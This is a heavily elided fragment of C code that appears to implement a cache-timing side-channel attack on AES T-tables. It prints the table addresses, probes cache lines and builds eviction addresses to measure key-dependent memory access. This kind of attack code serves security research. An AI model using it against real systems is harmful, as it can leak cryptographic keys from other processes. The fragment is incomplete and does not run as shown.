...
#define MIN_CACHE_HIT_CYCLES (620)
...
//   int te3 = 0x3fd5a0;
  ...
  printf("Te1 address: %p\n", Te1);
  printf("Te2 address: %p\n", Te2);
  ...
  for (probe = te0; probe < te1; probe += 64) // 16    
    maccess(probe);
  ...
  for (probe = te0; probe < te1; probe += 64) // 16    
  {
    faddrs[(size_t)(probe-te0)/64][0] = (uint64_t*) probe;
  }
...
//   printf("Base address: %p\n", base);
  for (size_t byte = 0; byte < 256; byte += 16)
  {
    ...
    for (probe = te0; probe < te1; probe += 64) // 16    
    {
      if (faddrs[(size_t)(probe-te0)/64][1] == 0)
      {
        eviction_ptr = (uint8_t*)(((size_t)eviction & ~0xFFF) | ((size_t)faddrs[(size_t)(probe-te0)/64][0] & 0xFFF));
        pick(faddrs[(probe-te0)/64],1);
      }
      size_t count = 0;
